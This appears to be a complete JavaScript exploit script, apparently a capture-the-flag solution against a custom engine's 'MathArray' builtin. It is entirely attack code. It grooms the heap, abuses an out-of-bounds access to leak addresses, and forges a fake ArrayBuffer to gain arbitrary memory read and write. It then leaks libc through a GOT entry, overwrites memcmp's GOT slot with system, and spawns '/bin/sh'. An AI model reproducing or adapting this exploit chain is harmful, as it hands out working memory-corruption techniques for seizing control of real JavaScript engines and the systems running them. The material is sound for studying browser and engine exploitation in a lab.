let leak_arr = new Uint32Array(8);
let leak_bigint = BigInt(0x1337);
let big_arr = new Uint8Array(256 * 1024);

let arrbuf1 = new ArrayBuffer(32);
let arrbuf2 = new ArrayBuffer(32);

big_arr.fill(0x41);

let tmp = [];
arrbuf1 = 'meme';
arrbuf2 = 'meme';
for (i = 0; i < 8; i++) {
    tmp.push(String('meme'))
    gc();
}

leak_arr[0] = 0; // set qword sign to 0
leak_arr[1] = 0;
leak_arr[2] = 0x1000;  // set qword size to 0x1000
leak_arr[3] = 0;
leak_arr[4] = 0x1000;  // set qword capacity to 0x1000
leak_arr[5] = 0;
leak_arr[6] = leak_arr[7] = 0x42424242; // marker to check if worked

function main() {
    const a = new MathArray([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
    let arr2 = [];

    for (i = 0; i < 32; i++) {
        arr2.push(new Array(leak_bigint, leak_arr.buffer));
        gc();
    }

    offset = 0x5000;
    for (i = 0; i < Math.floor(offset / 0x100); i++)
        a.add(0x100);
    a.add(offset % 0x100);
    a.add(0x30);

    leak_bigint_2 = a.at(0);
    function qword_at_off(offset) {
        return (leak_bigint_2 >> (BigInt(offset) * 64n)) & 0xffffffffffffffffn;
    }

    function hex(v) {
        return '0x' + v.toString(16).padStart(16, '0');
    }

    for (let i = 0; i < 512; i++) {
        leak = qword_at_off(i);
        if (leak != 0)
            print(`off=${i} = ${hex(leak)}`);
    }

    page_of_leak_arr_arrbuf = qword_at_off(51) & ~0xfffn;
    addr_of_leak_arr_arrbuf = page_of_leak_arr_arrbuf + 0x40n;
    print(`addrof leak_arr.buffer = ${hex(addr_of_leak_arr_arrbuf)}`)

    addr_of_big_arrbuf_backing_store = qword_at_off(17);
    print(`addrof big_arr.buffer's backing store = ${hex(addr_of_big_arrbuf_backing_store)}`)

    // arb rw
    // reset math array
    offset = 0x5000
    for (i = 0; i < Math.floor(offset / 0x100); i++)
        a.add(-0x100);
    a.add(-(offset % 0x100));
    a.add(-0x30);

    sign = addr_of_big_arrbuf_backing_store > addr_of_leak_arr_arrbuf ? 1 : -1;
    offset = Math.abs(Number(addr_of_big_arrbuf_backing_store - addr_of_leak_arr_arrbuf));
    print(`offset between leak_arr.buffer and big_arr.buffer's backing store = ${hex(offset)}`);
    for (i = 0; i < Math.floor(offset / 0x100); i++)
        a.add(0x100 * sign);
    a.add((offset % 0x100) * sign);

    corrupted_arrbuf = a.at(1);

    // create fake arrbuf for arb rw
    arrbuf_vtable = qword_at_off(8);
    arrbuf_shape = qword_at_off(11);
    print(`array buffer vtable = ${hex(arrbuf_vtable)}`);
    print(`array buffer shape = ${hex(arrbuf_shape)}`);

    faker = new BigUint64Array(big_arr.buffer);
    i = 0;
    faker[i++] = arrbuf_vtable;
    faker[i++] = 0n;
    faker[i++] = 0x100n;
    faker[i++] = arrbuf_shape;
    faker[i++] = 0n;
    faker[i++] = 0n;
    faker[i++] = 0n;
    faker[i++] = 0n;
    faker[i++] = 0n;
    backing_store_off = BigInt(i);
    faker[i++] = 0x1337n; // backing store of fake arrbuf
    faker[i++] = 0xff6n;
    faker[i++] = 0x1n;
    faker[i++] = 0n;
    faker[i++] = 0x40000n; // byte length
    faker[i++] = 0n;
    faker[i++] = 0x1n;
    faker[i++] = 0n;
    faker[i++] = 0n;
    faker[i++] = 0n;
    faker[i++] = 0x7ffe000000000000n;

    arb_rw_arr = new Uint32Array(corrupted_arrbuf);
    function read64(where) {
        faker[backing_store_off] = where;
        return BigInt(arb_rw_arr[0]) + (BigInt(arb_rw_arr[1]) << 32n);
    }
    function write64(where, what) {
        faker[backing_store_off] = where;
        arb_rw_arr[0] = Number(what & 0xffffffffn);
        arb_rw_arr[1] = Number(what >> 32n);
    }

    strtoul_got = arrbuf_vtable+0x1d0f0n;
    memcmp_got = strtoul_got+0x2b10n;
    libc_base = read64(strtoul_got);
    print(`libc leak = ${hex(libc_base)}`);
    libc_base -= 0x57b40n;
    print(`libc base = ${hex(libc_base)}`);
    libc_system = libc_base + 0x58750n;
    print(`libc system = ${hex(libc_system)}`);

    write64(memcmp_got, libc_system);

    cmd = "/bin/sh;"
    cmd_utf16 = []
    for (i = 0; i < cmd.length; i += 2)
        cmd_utf16.push(cmd.charCodeAt(i) + (cmd.charCodeAt(i + 1) << 8))

    String.fromCodePoint(...cmd_utf16).startsWith('KEK');
}

main();
